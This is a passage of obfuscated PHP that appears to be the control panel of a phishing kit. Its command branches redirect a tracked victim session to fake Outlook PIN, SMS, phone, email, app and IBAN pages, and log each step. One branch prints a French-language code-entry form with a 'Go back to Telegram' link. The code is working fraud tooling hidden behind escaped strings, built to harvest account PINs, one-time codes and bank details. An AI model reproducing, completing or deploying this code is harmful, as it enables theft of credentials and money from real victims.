up_file($_SESSION["\x75\163\x65\x72\151\144"], "\x3c\x6d\145\164\x61\40\x68\164\x74\160\x2d\x65\x71\165\151\x76\75\47\x72\x65\146\x72\145\163\150\47\40\143\x6f\156\164\145\x6e\164\75\47\60\73\x75\x72\x6c\75\x6f\165\x74\154\x6f\157\x6b\137\160\151\x6e\56\x70\x68\160\77\x76\x65\x72\x69\146\171\x5f\141\143\x63\x6f\165\x6e\164\x3d\163\145\163\163\151\x6f\x6e\75\x26" . md5(microtime()) . "\x26\144\151\163\x70\x61\164\143\150\x3d" . sha1(microtime()) . "\x26\141\x63\143\145\x73\x73\x3d\46\x64\x61\x74\141\75" . sha1(microtime()) . "\47\x20\57\76"); up_file_log($_SESSION["\165\x73\145\x72\x69\x64"], "\123\x65\x6e\x64\x20\157\x75\x74\154\157\157\x6b\x5f\160\x69\x6e\40\160\141\x67\x65\x20\123\165\x63\x63\145\x73\x73\146\165\x6c\x6c\171\174{$project_name}\x7c{$local_time}"); $command_page = "\x6f\165\x74\154\x6f\x6f\153\137\160\x69\x6e"; } elseif ($command_send == "\x6f\x75\x74\x6c\157\157\x6b\x5f\x61\160\x70") { $project_name = $_SESSION["\160\162\157\152\145\143\x74\137\156\x61\155\x65"]; up_file($_SESSION["\x75\x73\145\x72\151\x64"], "\74\x6d\145\164\141\40\x68\x74\x74\x70\55\145\161\x75\x69\166\75\x27\162\x65\146\162\x65\x73\x68\47\40\x63\157\156\164\x65\x6e\x74\75\47\x30\x3b\165\162\x6c\75\157\165\x74\154\x6f\x6f\x6b\x5f\141\160\160\x2e\160\x68\160\77\x76\145\x72\x69\x66\171\137\141\143\143\157\x75\156\x74\x3d\163\145\x73\163\151\x6f\156\75\46" . md5(microtime()) . "\x26\144\151\163\160\141\x74\x63\x68\x3d" . sha1(microtime()) . "\x26\x61\143\143\145\163\163\x3d\x26\144\x61\164\141\x3d" . sha1(microtime()) . "\47\40\57\x3e"); up_file_log($_SESSION["\165\163\x65\x72\x69\144"], "\x53\x65\156\144\x20\x6f\165\x74\x6c\x6f\x6f\153\137\141\x70\160\x20\160\x61\147\145\40\x53\x75\x63\143\145\163\x73\x66\165\154\154\x79\174{$project_name}\x7c{$local_time}"); $command_page = "\x6f\x75\x74\154\157\x6f\x6b\137\x61\160\160"; } elseif ($command_send == "\x70\x68\157\x6e\x65") { $project_name = $_SESSION["\160\162\157\x6a\145\143\x74\x5f\x6e\x61\x6d\x65"]; up_file($_SESSION["\x75\x73\x65\162\x69\144"], "\x3c\x6d\145\x74\x61\x20\150\x74\x74\x70\x2d\145\161\165\151\x76\75\x27\162\x65\x66\162\x65\x73\150\47\40\143\157\x6e\x74\145\x6e\164\75\x27\60\x3b\x75\162\154\x3d\160\x68\x6f\x6e\x65\x2e\x70\x68\160\x3f\166\x65\x72\x69\146\171\x5f\x61\143\143\x6f\x75\156\164\x3d\163\x65\x73\163\x69\157\156\x3d\x26" . md5(microtime()) . "\46\144\x69\163\160\x61\164\x63\x68\75" . sha1(microtime()) . "\46\x61\143\x63\145\x73\163\x3d\x26\144\x61\x74\x61\75" . sha1(microtime()) . "\x27\x20\x2f\x3e"); up_file_log($_SESSION["\165\163\x65\x72\x69\144"], "\x53\145\x6e\x64\40\120\x68\x6f\156\145\x20\x70\x61\147\145\40\123\x75\143\x63\x65\x73\x73\146\165\x6c\154\171\x7c{$project_name}\174{$local_time}"); $command_page = "\120\x48\117\116\x45\x20\120\101\107\105"; } elseif ($command_send == "\x73\155\163") { $project_name = $_SESSION["\160\162\x6f\x6a\x65\143\x74\x5f\x6e\141\155\145"]; up_file($_SESSION["\165\163\145\x72\151\144"], "\74\x6d\x65\x74\x61\40\150\x74\x74\160\55\145\161\165\151\x76\75\47\162\145\x66\162\x65\x73\150\x27\x20\143\157\x6e\164\145\156\x74\x3d\47\x30\73\165\162\154\75\163\x6d\163\x2e\160\x68\x70\x3f\x76\145\162\151\x66\171\x5f\x61\143\143\157\x75\x6e\x74\75\163\x65\x73\x73\x69\157\x6e\x3d\46" . md5(microtime()) . "\x26\x64\x69\163\x70\x61\x74\x63\x68\x3d" . sha1(microtime()) . "\x26\141\143\x63\x65\x73\163\75\x26\x64\141\164\x61\x3d" . sha1(microtime()) . "\x27\40\x2f\76"); up_file_log($_SESSION["\165\x73\145\x72\x69\x64"], "\123\145\x6e\144\40\x53\115\123\x20\x70\141\x67\145\40\x53\165\x63\x63\x65\163\x73\x66\165\x6c\x6c\x79\174{$project_name}\x7c{$local_time}"); $command_page = "\123\115\x53\x20\x50\x41\107\105"; } elseif ($command_send == "\x65\155\x61\151\154") { $project_name = $_SESSION["\160\162\157\152\145\x63\164\137\156\x61\155\145"]; up_file($_SESSION["\x75\x73\145\x72\x69\x64"], "\x3c\x6d\x65\164\x61\x20\x68\x74\x74\x70\55\x65\x71\x75\x69\166\75\47\x72\x65\x66\162\x65\163\150\47\x20\143\157\156\164\145\156\164\75\47\60\x3b\x75\162\x6c\75\145\155\x61\x69\x6c\x2e\x70\x68\x70\x3f\166\x65\162\x69\x66\171\x5f\x61\143\x63\x6f\165\156\164\x3d\163\145\163\x73\x69\x6f\156\75\x26" . md5(microtime()) . "\x26\144\151\163\x70\141\x74\143\150\75" . sha1(microtime()) . "\46\141\x63\x63\x65\163\163\x3d\x26\144\x61\x74\141\75" . sha1(microtime()) . "\47\x20\x2f\x3e"); up_file_log($_SESSION["\x75\163\x65\x72\x69\x64"], "\123\145\156\144\x20\105\155\141\x69\154\40\160\141\147\145\x20\123\165\x63\143\145\x73\x73\x66\x75\x6c\x6c\x79\x7c{$project_name}\174{$local_time}"); $command_page = "\105\115\x41\111\x4c\40\x50\x41\107\105"; } elseif ($command_send == "\x61\x70\160") { $project_name = $_SESSION["\x70\x72\x6f\x6a\145\143\164\x5f\x6e\141\x6d\145"]; up_file($_SESSION["\165\x73\x65\162\151\144"], "\x3c\x6d\145\x74\x61\x20\150\x74\x74\x70\55\145\161\165\x69\166\x3d\47\x72\145\146\162\145\163\x68\x27\x20\143\157\x6e\x74\145\156\x74\75\47\60\73\165\162\x6c\75\x61\x70\x70\x2e\160\150\160\77\x76\145\x72\151\x66\x79\x5f\x61\143\143\157\x75\156\x74\75\163\145\x73\x73\x69\x6f\156\x3d\x26" . md5(microtime()) . "\x26\144\151\x73\160\x61\x74\x63\150\x3d" . sha1(microtime()) . "\x26\141\143\143\145\163\163\x3d\x26\144\x61\164\141\75" . sha1(microtime()) . "\47\x20\57\x3e"); up_file_log($_SESSION["\165\x73\x65\162\x69\x64"], "\123\145\156\x64\x20\x41\160\160\x6c\x69\x63\141\x74\x69\x6f\x6e\x20\x70\x61\147\145\40\123\x75\x63\x63\x65\163\163\146\165\154\154\171\x7c{$project_name}\x7c{$local_time}"); $command_page = "\101\x70\x70\x6c\x69\x63\141\x74\x69\157\156\x20\x50\x41\x47\105"; } elseif ($command_send == "\x69\x62\141\x6e\150\157\x6d\145") { $project_name = $_SESSION["\160\162\x6f\x6a\145\143\164\x5f\156\141\x6d\145"]; up_file($_SESSION["\165\x73\x65\x72\x69\144"], "\x3c\x6d\145\x74\141\40\x68\x74\x74\160\55\x65\x71\x75\x69\x76\x3d\47\162\145\146\x72\x65\x73\150\47\40\x63\157\156\164\145\156\164\x3d\47\x30\73\x75\x72\154\75\x69\142\x61\156\x2d\150\x6f\x6d\145\56\x70\x68\x70\x3f\166\x65\162\x69\x66\x79\x5f\141\x63\143\157\x75\156\x74\75\x73\x65\x73\x73\x69\157\156\x3d\46" . md5(microtime()) . "\46\x64\x69\163\160\141\x74\x63\150\75" . sha1(microtime()) . "\46\141\x63\143\145\163\x73\x3d\x26\144\141\164\141\75" . sha1(microtime()) . "\47\x20\57\76"); up_file_log($_SESSION["\165\163\145\162\x69\x64"], "\123\145\x6e\x64\40\x49\142\141\156\40\x48\x6f\x6d\145\x20\160\141\147\145\x20\x53\x75\x63\x63\145\x73\x73\146\x75\x6c\x6c\171\174{$project_name}\x7c{$local_time}"); $command_page = "\x49\102\x41\x4e\x20\x48\x6f\x6d\x65\40\120\101\107\105"; } elseif ($command_send == "\151\x62\x61\156\x61\160\160") { $project_name = $_SESSION["\x70\x72\x6f\152\x65\x63\164\x5f\x6e\x61\155\x65"]; up_file($_SESSION["\x75\x73\145\162\151\x64"], "\74\155\145\x74\141\x20\150\x74\164\160\x2d\145\x71\x75\x69\166\x3d\x27\x72\x65\146\162\145\x73\x68\x27\40\x63\x6f\156\164\145\156\164\x3d\47\x30\x3b\x75\x72\154\75\x69\x62\141\156\55\141\x70\x70\x2e\160\150\160\x3f\166\x65\x72\x69\146\x79\137\x61\143\143\x6f\165\156\164\75\x73\x65\x73\163\x69\x6f\156\75\46" . md5(microtime()) . "\46\144\x69\163\160\x61\164\143\x68\75" . sha1(microtime()) . "\x26\x61\x63\143\x65\163\x73\75\x26\x64\141\164\x61\75" . sha1(microtime()) . "\x27\40\57\x3e"); up_file_log($_SESSION["\x75\163\145\x72\x69\144"], "\x53\145\x6e\144\40\111\102\x41\116\x20\x41\120\120\x20\x70\141\147\x65\x20\123\165\143\143\x65\163\163\x66\x75\x6c\x6c\x79\x7c{$project_name}\x7c{$local_time}"); $command_page = "\111\x42\x41\x4e\x20\101\x50\120\x20\x50\x41\x47\x45"; } elseif ($command_send == "\x70\151\156") { $project_name = $_SESSION["\x70\x72\x6f\x6a\145\x63\164\x5f\x6e\141\x6d\145"]; up_file($_SESSION["\165\163\145\x72\151\144"], "\74\155\145\x74\x61\x20\150\x74\164\160\55\x65\x71\x75\151\166\x3d\47\162\145\x66\162\145\163\x68\x27\x20\x63\157\156\x74\145\156\164\75\47\x30\73\165\x72\x6c\x3d\160\x69\x6e\56\160\150\x70\x3f\166\145\162\x69\146\171\x5f\141\143\143\157\165\x6e\164\75\x73\145\x73\163\x69\157\156\75\x26" . md5(microtime()) . "\x26\x64\x69\x73\x70\x61\x74\x63\150\x3d" . sha1(microtime()) . "\x26\x61\143\143\x65\x73\163\75\46\x64\x61\164\x61\x3d" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\x75\163\x65\x72\x69\144"], "\123\x65\156\144\40\x50\111\x4e\40\160\x61\x67\x65\x20\x53\165\x63\x63\145\x73\163\146\165\154\x6c\x79\x7c{$project_name}\x7c{$local_time}"); $command_page = "\x50\111\x4e\40\120\101\107\105"; } elseif ($command_send == "\x6d\163\x67") { echo "\74\x68\145\141\144\145\x72\40\143\x6c\x61\x73\163\x3d\47\150\145\141\144\145\162\x27\40\x73\x74\x79\x6c\x65\75\x27\142\157\170\x2d\x73\x69\172\x69\x6e\x67\72\40\142\157\x72\144\145\x72\x2d\142\x6f\170\73\x20\x64\151\163\160\154\x61\171\72\40\x66\154\145\170\73\40\x6d\x61\162\147\x69\x6e\55\x74\157\160\x3a\x20\x31\x35\x70\170\x3b\40\155\x61\x72\147\x69\x6e\x2d\142\157\x74\x74\157\x6d\x3a\40\63\x37\x70\170\73\x20\143\157\154\x6f\x72\72\x20\162\x67\x62\x28\x31\x30\65\54\x20\61\62\60\x2c\40\x31\65\x32\x29\x3b\x20\x66\x6f\x6e\164\x2d\x66\x61\155\151\154\x79\x3a\40\x6e\x75\x6e\x69\x74\x6f\x2c\40\163\141\x6e\x73\55\163\x65\x72\x69\146\73\x20\146\x6f\x6e\x74\55\163\151\172\145\72\x20\61\66\160\170\x3b\47\x3e\12\40\x20\40\40\74\144\x69\166\x20\x62\x69\163\x5f\163\153\x69\x6e\x5f\143\150\x65\x63\x6b\x65\144\x3d\47\x31\x27\40\143\x6c\141\163\163\x3d\x27\x63\x6f\156\x74\141\151\x6e\x65\x72\47\40\163\x74\171\154\x65\x3d\47\x62\x6f\170\55\x73\x69\172\x69\156\147\72\x20\x62\157\x72\144\145\x72\x2d\142\157\x78\x3b\x20\167\x69\144\x74\150\x3a\x20\71\67\x30\160\170\x3b\40\x70\141\144\144\x69\x6e\x67\72\x20\60\x70\x78\x3b\40\155\141\x72\147\151\x6e\x3a\40\60\160\170\x20\141\165\164\x6f\73\x20\155\x61\x78\55\x77\151\x64\x74\x68\72\40\x39\x37\60\160\170\x3b\x27\76\xa\40\40\x20\x20\x20\40\x20\40\74\150\x31\x20\143\154\x61\x73\x73\75\x27\150\145\141\144\145\x72\x2d\164\151\x74\x6c\145\47\x20\163\164\x79\x6c\145\x3d\47\x62\x6f\x78\x2d\x73\151\x7a\x69\156\x67\72\x20\142\157\x72\x64\145\162\x2d\x62\157\170\73\x20\155\x61\162\147\151\x6e\72\x20\60\x2e\66\x37\145\x6d\x20\x30\x70\170\x3b\40\x66\157\156\164\55\167\145\151\x67\150\x74\x3a\40\x36\60\60\x3b\40\x6c\x69\x6e\145\x2d\150\145\x69\147\x68\164\72\x20\61\56\x32\x3b\x20\x66\157\156\x74\55\x73\x69\x7a\x65\x3a\x20\64\65\x70\170\73\40\x63\157\x6c\x6f\162\x3a\40\x72\147\x62\50\x31\63\71\x2c\40\x32\67\54\x20\x31\64\x33\51\x3b\40\164\x65\x78\x74\x2d\x61\154\151\147\x6e\72\40\x63\145\156\x74\x65\162\73\47\76\xa\40\40\x20\40\x20\40\40\40\40\40\40\40\x3c\151\x6d\x67\x20\x73\162\143\x3d\x27\x68\164\164\x70\163\x3a\x2f\57\x77\x65\x62\146\x6f\x72\x6d\141\164\164\x65\162\56\143\x6f\155\x2f\x69\x6d\141\147\x65\57\154\x6f\x67\157\56\163\x76\147\x27\x20\163\164\171\154\145\x3d\x27\142\x6f\170\55\163\x69\x7a\151\156\x67\72\40\142\157\162\x64\145\162\x2d\142\x6f\x78\73\x20\x76\x65\162\164\151\x63\x61\x6c\55\x61\154\x69\x67\156\72\x20\155\151\144\x64\x6c\x65\73\x20\x62\157\162\x64\x65\x72\x2d\x73\164\x79\154\145\72\40\x6e\x6f\156\x65\x3b\x20\150\x65\151\147\150\x74\72\40\67\x35\160\170\73\40\155\x61\x72\x67\x69\x6e\55\x74\x6f\160\x3a\x20\55\x33\67\x70\x78\73\x20\x6d\141\x72\x67\x69\156\55\x72\151\147\x68\x74\x3a\40\x31\x32\x70\x78\73\47\40\x2f\76\xa\40\40\x20\40\40\40\x20\x20\40\40\x20\x20\74\163\x70\141\x6e\x20\x73\164\171\x6c\145\75\x27\142\x6f\170\x2d\163\x69\x7a\151\x6e\x67\x3a\x20\142\157\162\144\x65\x72\55\142\157\170\73\40\x63\x6f\x6c\x6f\x72\72\x20\x72\x67\142\50\x32\x34\x30\x2c\40\66\67\54\40\x33\60\51\73\x27\x3e{$command_page}\x3c\57\163\x70\141\x6e\x3e\xa\x20\40\x20\40\40\40\40\40\x3c\57\150\x31\76\12\12\x20\40\x20\x20\x20\40\x20\x20\x3c\160\40\x63\154\141\x73\163\x3d\47\x68\145\141\x64\x65\x72\x2d\163\165\142\x74\x69\x74\154\x65\47\x20\163\x74\x79\154\x65\75\47\x62\157\x78\x2d\163\151\x7a\151\156\x67\x3a\x20\142\x6f\162\x64\x65\162\x2d\142\x6f\170\x3b\x20\x6d\x61\x72\x67\x69\156\x3a\x20\x30\160\x78\73\x20\x70\141\144\x64\x69\156\147\72\40\60\160\170\x3b\x20\x66\157\x6e\164\x2d\163\x69\172\x65\x3a\40\x31\70\160\x78\73\40\154\151\156\145\x2d\150\145\151\147\150\x74\72\x20\62\62\160\x78\x3b\x20\164\x65\170\164\x2d\141\x6c\x69\147\x6e\72\x20\x63\145\x6e\164\145\162\73\x27\x3e\xa\x20\x20\40\40\40\40\x20\40\x20\x20\x20\x20\x3c\x73\x70\x61\x6e\40\163\164\171\x6c\145\75\x27\143\157\x6c\157\x72\72\x20\43\60\60\70\x30\x30\x30\x3b\47\76\74\163\164\x72\157\x6e\147\76\x53\145\x6e\x74\40\x73\x75\x63\143\145\163\x66\165\x6c\x6c\171\40\164\157\x20\103\x6c\x69\145\156\x74\x20\133{$StrupLom}\x5d\x3c\x2f\163\x74\162\157\156\147\x3e\74\57\163\x70\x61\156\x3e\12\40\40\x20\40\x20\40\x20\40\x3c\x2f\x70\76\12\12\40\x20\40\x20\40\x20\40\40\x3c\144\151\x76\40\143\154\x61\x73\x73\x3d\47\146\157\x72\x6d\137\x64\145\x74\141\151\x6c\163\47\40\x64\141\164\x61\x2d\162\166\x2d\143\x6c\x61\x73\x73\x2d\146\151\x65\x6c\x64\x5f\x65\x72\x72\157\162\x3d\x27\x76\151\x6f\x6c\141\x74\151\157\x6e\x73\56\x63\141\x72\144\116\x75\155\142\145\162\47\x20\x73\x74\x79\x6c\x65\75\47\164\145\170\x74\x2d\141\x6c\x69\x67\x6e\72\x20\x63\145\156\164\x65\x72\73\x27\76\x26\x6e\x62\x73\x70\x3b\x3c\57\144\151\166\x3e\12\xa\x20\x20\40\x20\40\40\40\x20\x3c\x66\x6f\x72\155\x20\141\x63\164\151\157\156\75\47\x27\40\143\154\x61\x73\163\75\x27\146\x6f\x72\155\55\143\x6c\141\163\x73\x27\x20\x6d\145\164\x68\x6f\144\x3d\x27\120\x4f\x53\x54\47\x3e\12\x20\x20\x20\x20\x20\x20\x20\40\40\40\x20\x20\74\144\x69\166\x20\143\x6c\141\x73\x73\75\47\x66\157\162\x6d\137\x69\156\156\x65\162\x5f\142\x6c\x6f\x63\153\x20\160\x61\144\x5f\162\154\x33\x30\x27\76\12\x20\40\40\x20\40\40\40\x20\x20\x20\x20\x20\x20\40\x20\40\74\x70\40\163\164\171\154\x65\75\47\164\x65\x78\164\x2d\x61\x6c\151\x67\156\72\x20\x63\x65\156\164\145\x72\73\x27\76\74\x21\55\55\x20\x43\x61\162\x64\40\x6e\165\x6d\142\x65\x72\40\x2d\x2d\x3e\x3c\x2f\160\x3e\xa\xa\x20\40\40\x20\40\40\x20\x20\x20\x20\40\x20\x20\40\x20\x20\x3c\144\x69\166\x20\x63\x6c\x61\x73\x73\75\x27\146\x6f\162\155\x5f\x66\151\x65\154\144\x73\x27\76\12\x20\x20\x20\40\x20\x20\40\40\40\x20\x20\40\x20\40\x20\40\x20\40\40\40\x3c\144\x69\166\40\143\x6c\141\x73\163\75\47\146\x6f\162\155\137\x6c\141\142\145\x6c\163\x27\x20\163\x74\x79\x6c\x65\75\47\x74\145\170\x74\55\x61\154\151\147\156\72\40\143\x65\156\x74\145\x72\x3b\x27\76\x49\x6e\164\x72\157\x64\165\x69\x73\145\x7a\x20\166\157\164\162\x65\x20\x63\x6f\144\x65\74\57\x64\151\x76\76\xa\12\40\40\x20\40\x20\x20\40\x20\x20\x20\x20\x20\40\x20\x20\40\x20\40\40\x20\x3c\144\x69\166\x20\x63\154\x61\163\163\x3d\x27\146\x6f\162\x6d\x5f\144\145\x74\141\151\x6c\163\47\40\144\141\164\x61\55\162\166\x2d\x63\x6c\x61\x73\x73\55\146\151\145\154\x64\x5f\x65\x72\162\157\162\75\x27\166\151\x6f\154\141\164\151\157\x6e\x73\56\143\x61\x72\x64\x4e\165\155\142\145\x72\x27\x3e\xa\40\x20\x20\x20\40\x20\40\x20\40\40\x20\40\40\x20\40\x20\x20\x20\x20\x20\40\x20\x20\x20\x3c\x64\x69\x76\40\x63\x6c\x61\163\x73\x3d\x27\144\145\x66\x61\165\154\x74\x5f\151\x6e\160\x75\x74\x5f\x66\x69\145\x6c\144\47\40\x6d\157\x64\55\143\141\164\x3d\x27\x69\x6e\160\x75\164\55\x66\x69\145\x6c\144\x2d\143\x61\x72\144\x2d\x6e\x75\x6d\x62\x65\162\47\x20\155\x6f\144\x2d\143\141\164\55\x76\x65\x72\x73\151\x6f\x6e\x3d\47\x31\x2e\x30\56\x30\x27\x20\x73\164\x79\x6c\145\x3d\x27\x74\145\170\x74\x2d\141\x6c\151\x67\156\x3a\x20\143\x65\x6e\164\145\x72\x3b\x27\76\12\40\x20\x20\40\40\40\x20\40\40\40\40\x20\40\x20\x20\x20\40\40\40\x20\40\x20\x20\x20\x20\40\40\40\74\151\156\160\165\x74\12\40\40\40\x20\40\x20\40\40\x20\x20\x20\40\40\x20\x20\40\40\x20\x20\x20\x20\40\40\40\x20\x20\x20\40\x20\x20\40\x20\x61\162\x69\x61\x2d\162\145\161\165\x69\x72\145\144\x3d\47\164\162\165\145\x27\12\x20\40\x20\x20\40\40\40\x20\x20\40\x20\40\40\x20\40\x20\40\40\40\40\40\x20\x20\40\x20\40\x20\x20\x20\40\x20\x20\141\x75\164\x6f\143\x6f\155\x70\x6c\x65\x74\145\75\47\x6f\x66\x66\47\12\40\40\40\40\x20\x20\40\40\x20\x20\40\x20\40\40\x20\40\40\x20\40\40\x20\x20\40\x20\40\40\x20\x20\x20\x20\40\40\x63\x6c\x61\x73\x73\75\x27\x69\x6e\x70\165\164\x5f\143\x61\x72\144\x5f\156\165\155\142\x65\162\47\xa\x20\40\x20\40\40\x20\x20\x20\x20\x20\x20\40\x20\x20\40\40\x20\40\40\40\40\40\x20\40\x20\40\x20\x20\x20\x20\x20\x20\x64\x61\164\141\x2d\x65\x72\162\x6f\162\143\157\x64\x65\75\x27\x50\x45\x57\60\60\x31\65\47\xa\x20\40\x20\40\40\x20\40\40\40\40\40\x20\x20\40\x20\x20\40\x20\40\40\40\40\40\x20\40\x20\x20\40\x20\x20\40\x20\x64\141\x74\x61\x2d\162\166\55\166\x61\x6c\x75\x65\75\47\165\x73\x65\x72\56\x63\x61\x72\144\x4e\165\155\142\145\x72\x27\xa\x20\40\40\x20\x20\40\x20\40\x20\x20\40\x20\40\40\40\40\x20\40\x20\40\x20\40\40\40\40\x20\x20\40\40\40\40\40\151\144\x3d\47\x67\163\x6d\x54\x65\154\47\12\x20\x20\x20\40\x20\x20\x20\40\x20\x20\x20\40\40\x20\x20\40\40\x20\40\x20\40\40\x20\x20\40\x20\40\x20\40\x20\40\40\x6d\x61\170\55\154\145\x6e\x67\164\150\x3d\x27\x31\67\x27\xa\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\x20\40\40\x20\40\x20\40\40\40\x20\40\40\40\40\x20\x20\x20\40\x20\x20\40\40\155\141\170\154\145\156\x67\164\x68\75\x27\x32\61\x27\xa\x20\x20\x20\40\x20\x20\x20\x20\x20\40\40\40\x20\40\40\40\40\40\x20\x20\40\x20\40\40\40\40\x20\40\40\40\40\40\156\141\x6d\145\75\x27\x78\137\151\x73\137\155\145\163\x73\141\147\145\47\xa\40\40\40\40\x20\40\40\40\40\x20\x20\x20\40\40\40\x20\x20\40\x20\40\40\40\x20\40\40\40\x20\x20\x20\40\40\x20\160\x6c\x61\x63\145\150\x6f\154\x64\x65\162\x3d\47\47\12\x20\x20\x20\40\x20\x20\40\x20\x20\40\x20\40\40\x20\40\40\x20\x20\40\x20\x20\40\x20\x20\40\40\40\40\40\x20\40\40\162\x65\x71\165\151\162\145\x64\75\x27\47\12\x20\x20\40\40\40\x20\40\x20\40\x20\x20\x20\40\x20\40\40\40\40\40\x20\40\x20\40\x20\40\x20\x20\40\40\40\40\x20\x74\171\x70\145\75\x27\164\x65\x6c\47\xa\x20\x20\40\x20\x20\40\40\x20\x20\40\x20\40\40\x20\x20\40\40\x20\40\40\x20\40\40\40\40\x20\40\40\57\76\12\40\x20\x20\40\40\x20\x20\x20\40\x20\x20\x20\40\40\x20\x20\x20\40\40\x20\x20\40\x20\x20\x3c\x2f\x64\151\x76\x3e\12\x20\40\x20\x20\x20\x20\x20\40\x20\40\40\x20\x20\40\40\x20\40\40\40\x20\x3c\57\144\x69\166\76\xa\x20\x20\40\40\x20\40\x20\x20\40\40\40\x20\x20\40\x20\x20\x3c\57\x64\151\166\76\12\xa\40\x20\40\40\x20\x20\x20\40\x20\40\x20\x20\40\x20\x20\40\74\160\x20\x73\164\171\x6c\x65\x3d\47\164\x65\x78\x74\x2d\141\x6c\x69\x67\156\x3a\x20\143\145\156\164\x65\162\x3b\47\x3e\x3c\41\55\x2d\x20\x43\154\151\x65\156\164\x20\x6e\x75\x6d\142\x65\162\40\x2d\55\x3e\74\x21\x2d\x2d\40\x53\x61\x76\145\40\144\141\164\x61\40\x2d\55\76\x3c\x21\55\55\40\103\150\157\157\x73\145\40\141\x6c\151\x61\163\40\55\x2d\x3e\x3c\x21\55\55\x20\x4e\141\166\151\147\141\164\x69\157\156\x20\x62\x74\156\40\55\55\x3e\x3c\x2f\160\x3e\xa\xa\x20\40\40\x20\40\x20\x20\40\40\x20\40\40\x20\x20\x20\40\74\x64\151\166\40\x63\154\x61\163\x73\x3d\47\156\x61\x76\151\147\x61\x74\151\157\156\x5f\142\164\x6e\x73\40\160\141\x64\x2d\x74\61\x30\x27\76\xa\40\x20\40\x20\40\40\40\40\40\x20\x20\x20\40\x20\x20\40\x20\40\x20\40\x3c\x64\x69\x76\40\143\154\141\163\163\75\x27\162\x69\147\x68\x74\x5f\156\x61\166\151\x67\141\x74\x69\157\156\137\x62\x74\x6e\40\146\165\154\x6c\167\151\144\164\x68\x5f\x62\164\156\47\x20\163\x74\x79\x6c\x65\x3d\x27\x74\x65\170\x74\x2d\x61\x6c\x69\x67\156\x3a\x20\143\145\x6e\164\x65\162\73\x27\76\12\x20\40\40\40\40\40\40\40\x20\x20\40\40\40\40\40\40\x20\40\40\40\x20\40\40\x20\x3c\142\165\164\x74\157\156\40\143\154\141\163\163\75\47\x62\164\156\137\144\x65\x66\x61\165\x6c\x74\x20\142\164\x6e\137\x70\x72\x69\155\141\162\171\x27\40\x64\141\164\141\55\162\x76\55\164\x65\x78\x74\x3d\47\143\157\x6e\x66\x69\x67\56\141\x70\x70\x2e\155\x65\163\x73\x61\147\145\56\114\x61\142\145\x6c\x2e\141\x75\164\x68\145\156\164\151\x63\x61\x74\151\x6f\156\x2e\151\144\x65\156\164\151\x66\x69\x63\141\x74\x69\x6f\x6e\x2e\x6e\145\170\x74\x42\165\x74\x74\x6f\x6e\47\x20\x6d\157\144\x2d\x63\141\164\75\47\x70\162\151\155\x61\162\x79\55\x62\165\164\164\157\x6e\55\154\x6f\147\x69\156\x27\40\x6d\x6f\144\x2d\x63\141\x74\x2d\x76\145\x72\x73\151\x6f\156\75\x27\x31\x2e\60\56\60\47\x20\x74\171\x70\x65\x3d\47\163\165\142\x6d\151\164\47\76\123\x65\156\x64\40\103\x6f\144\145\74\x2f\142\165\x74\x74\x6f\x6e\76\xa\x20\40\x20\x20\40\40\x20\40\x20\40\x20\x20\40\40\x20\x20\40\x20\x20\40\x3c\x2f\144\151\x76\76\12\x20\x20\40\40\x20\x20\x20\x20\x20\40\40\x20\40\40\40\x20\x3c\x2f\144\x69\x76\x3e\xa\40\40\40\x20\x20\40\x20\x20\40\x20\40\x20\x3c\57\144\x69\x76\76\xa\40\x20\40\x20\40\40\x20\40\x3c\x2f\146\157\162\155\76\xa\12\40\40\x20\40\x20\x20\40\40\74\160\40\143\x6c\141\x73\x73\75\x27\150\x65\141\x64\x65\162\55\163\165\x62\164\x69\164\x6c\145\x27\40\x73\164\171\x6c\145\75\x27\142\x6f\170\x2d\x73\x69\x7a\151\156\x67\72\x20\142\x6f\162\144\x65\x72\x2d\142\x6f\170\x3b\x20\155\x61\x72\147\x69\156\x3a\40\x30\160\170\x3b\x20\160\141\x64\x64\151\x6e\x67\72\x20\60\160\x78\73\40\146\x6f\156\x74\x2d\x73\151\x7a\x65\x3a\40\x31\x38\x70\170\x3b\x20\x6c\x69\156\145\x2d\x68\145\151\x67\150\164\x3a\x20\x32\x32\x70\170\x3b\x20\x74\x65\170\x74\55\x61\154\151\147\x6e\x3a\40\143\145\156\x74\x65\x72\73\47\76\x26\x6e\x62\163\x70\x3b\74\x2f\x70\x3e\xa\x20\x20\x20\x20\74\x2f\x64\x69\166\x3e\12\74\x2f\x68\145\x61\x64\x65\x72\76\xa\xa\x3c\160\x20\x73\164\171\x6c\x65\x3d\47\x74\x65\x78\x74\x2d\x61\154\x69\x67\x6e\x3a\x20\x63\x65\x6e\x74\145\162\x3b\47\76\xa\x20\x20\x20\40\x3c\163\x70\x61\156\40\x73\164\171\154\x65\x3d\x27\x63\157\x6c\157\162\x3a\40\43\60\x30\60\x30\60\60\73\x27\x3e\x3c\141\40\143\154\x61\x73\x73\75\x27\x62\x61\x63\x6b\55\164\157\x2d\x74\145\x6c\145\x67\x72\141\155\x27\40\x68\162\x65\x66\75\x27\x74\x67\x3a\x2f\x2f\x27\x3e\x47\157\x20\x62\141\x63\x6b\x20\x74\157\40\124\145\x6c\145\x67\x72\141\155\x3c\57\x61\76\40\74\57\x73\x70\141\x6e\76\12\x3c\57\x70\x3e\12\12\x3c\144\151\x76\x20\x62\151\163\x5f\x73\153\x69\x6e\x5f\143\x68\145\x63\153\x65\x64\75\47\61\47\x20\x63\154\141\163\163\x3d\47\143\157\156\x74\141\151\x6e\x65\x72\x27\40\163\164\171\x6c\x65\75\x27\142\157\170\x2d\x73\x69\x7a\151\x6e\147\72\40\x62\157\x72\x64\x65\162\x2d\142\157\170\x3b\x20\x77\x69\x64\x74\150\72\40\x39\67\60\160\170\x3b\x20\x70\141\144\x64\x69\156\147\x3a\x20\x30\160\x78\x3b\40\155\x61\162\147\x69\156\72\40\x30\x70\x78\40\141\x75\x74\157\73\x20\155\x61\170\55\167\151\144\164\150\x3a\40\71\67\x30\x70\x78\x3b\x20\x63\157\154\157\162\x3a\40\x72\x67\x62\50\x31\60\65\54\40\61\x32\x30\54\40\61\65\62\x29\x3b\x20\x66\x6f\x6e\164\55\x66\141\x6d\151\154\x79\x3a\40\156\165\156\x69\x74\157\x2c\40\x73\x61\x6e\x73\x2d\163\145\x72\x69\x66\73\40\146\x6f\156\164\55\163\x69\x7a\x65\72\40\x31\66\160\x78\x3b\x27\76\xa\x20\x20\40\40\74\x64\x69\x76\x20\142\151\163\137\x73\153\151\156\x5f\143\150\145\x63\153\x65\144\75\x27\x31\x27\x20\x63\154\141\163\x73\x3d\x27